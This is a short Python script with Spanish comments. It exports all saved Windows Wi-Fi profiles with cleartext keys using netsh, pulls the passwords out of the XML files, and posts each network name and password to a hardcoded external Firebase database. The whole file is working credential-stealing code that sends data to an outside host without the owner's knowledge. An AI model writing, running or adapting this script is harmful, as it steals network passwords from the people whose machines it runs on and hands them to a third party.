import subprocess
import os
import errno
import glob
import shutil
import smtplib
from email.message import EmailMessage
from firebase import firebase

#Creamos una carpeta/folder donde se guardara las claves de wifi
try:
    os.mkdir('./wifi')
except OSError as error:
    if error.errno != errno.EEXIST:
        raise
#Muestra todas las redes wifi que la pc fue conectada
show = subprocess.check_output(['netsh', 'wlan', 'show', 'profile'])
networks = subprocess.check_output(['netsh', 'wlan', 'show', 'networks'])
#exporta las claves de wifi en archivos .xml
a = subprocess.check_output(['netsh', 'wlan', 'export', 'profile','key=clear']).decode('utf-8').split('\n')
#Mover archivos .xml a la carpeta wifi
source_dir = './' #Inicio de la carpeta 
dst = './wifi' #Nueva carpeta destinatario 
try:
    files = glob.iglob(os.path.join(source_dir, "*.xml"))
    #englobar los archivos a mover
    for file in files:
        if os.path.isfile(file):
            shutil.move(file, dst) #Mover todos los archivos a una nueva carpeta
except:
    print("An exception occurred")

path = "./wifi"
passwords = []
wifi_names = []

folder = os.listdir(path)

for file in folder:
    openfile = open("./wifi/" + file, "r")
    line = openfile.readline()

    while(line):
        if "keyMaterial" in line:
            raw_line = line.replace("\t\t\t\t<keyMaterial>", "")
            raw_password = raw_line.replace("</keyMaterial>", "")
            password = raw_password.replace("\n", "")

            passwords.append(password)
            
            line = openfile.readline()

            wifi_name_file = file.replace("Wi-Fi-", "")
            wifi_name = wifi_name_file.replace(".xml", "")
            wifi_names.append(wifi_name)
        else:
            line = openfile.readline()

db = firebase.FirebaseApplication('https://python-b0978-default-rtdb.firebaseio.com/')

for index in range(len(wifi_names)):
    data = {"Wi-Fi": wifi_names[index],"Password": passwords[index]}
    datos = db.post("/wifi's", data)